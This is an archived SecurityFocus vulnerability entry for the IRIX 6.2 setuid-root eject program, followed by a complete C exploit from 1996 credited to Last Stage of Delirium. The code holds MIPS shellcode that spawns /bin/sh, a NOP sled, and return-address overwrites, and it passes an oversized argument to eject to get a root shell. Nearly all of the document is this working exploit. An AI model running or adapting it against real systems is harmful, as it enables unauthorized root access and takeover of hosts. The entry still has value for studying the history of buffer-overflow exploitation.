source: http://www.securityfocus.com/bid/351/info
 
A vulnerability exists in the eject program shipped with Irix 6.2 from Silicon Graphics. By supplying a long argument to the eject program, it is possible to overwrite the return address on the stack, and execute arbitrary code as root. Eject is normally used to eject removeable media from the system, and as such is setuid root to allow for any user at the console to perform eject operations.

/* copyright by */
/* Last Stage of Delirium, Dec 1996, Poland*/

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>

#define BUFSIZE 2068
#define OFFS 800
#define ADDRS 3
#define ALIGN 0
#define ALIGN2 4

char asmcode[]="\x3c\x18\x2f\x62\x37\x18\x69\x6e\x3c\x19\x2f\x73\x37\x39\x68\x2e\xaf\xb8\xff\xf8\xaf\xb9\xff\xfc\xa3\xa0\xff\xff\x27\xa4\xff\xf8\x27\xa5\xff\xf0\x01\x60\x30\x24\xaf\xa4\xff\xf0\xaf\xa0\xff\xf4\x24\x02\x04\x23\x02\x04\x8d\x0c";
char nop[]="\x24\x0f\x12\x34";

void run(unsigned char *buf) {
  execl("/usr/sbin/eject","lsd",buf,NULL);
  printf("execl failed\n");
}

char jump[]="\x03\xa0\x10\x25\x03\xe0\x00\x08\x24\x0f\x12\x34\x24\x0f\x12\x34";

main(int argc, char *argv[]) {
  char *buf, *ptr, addr[8];
  int offs=OFFS, bufsize=BUFSIZE, addrs=ADDRS, align=ALIGN;
  int i, noplen=strlen(nop);

  if (argc >1) bufsize=atoi(argv[1]);
  if (argc >2) offs=atoi(argv[2]);
  if (argc >3) addrs=atoi(argv[3]);
  if (argc >4) align=atoi(argv[4]);

  if (bufsize<strlen(asmcode)) {
    printf("bufsize too small, code is %d bytes long\n", strlen(asmcode));
    exit(1);
  }
  if ((buf=malloc(bufsize+(ADDRS<<2)+noplen+1))==NULL) {
    printf("Can't malloc\n");
    exit(1);
  }

  *(int *)addr=(*(unsigned long(*)())jump)()+offs;
  printf("address=%p\n",*(int *)addr);

  strcpy(buf,nop);
  ptr=buf+noplen;
  buf+=4-align;
  for(i=0;i<bufsize;i++)
   *ptr++=nop[i%noplen];
  memcpy(ptr-strlen(asmcode),asmcode,strlen(asmcode));
  for(i=0;i<(addrs<<2);i++)
   *ptr++=addr[i%sizeof(int)];
  *ptr=0;

  printf("buflen=%d\n", strlen(buf));
  fflush(stdout);

  ptr-=addrs<<2;
  *(int *)addr+=(0x7fff350c-0x7fff31e8)+(4*100)+ALIGN2;
  for(i=0;i<64;i++)
   *ptr++=addr[i&3];


/* gp value is set here */
  ptr=buf+ALIGN+(0x7fff2f00-0x7fff2ce8)-24;
  *(int *)addr=(*(unsigned long(*)())jump)()+OFFS+(0x7fff350c-0x7fff31e8-4)+ALIGN2+32+32412;

  for(i=0;i<64;i++)
   *ptr++=addr[i&3];

  run(buf);
}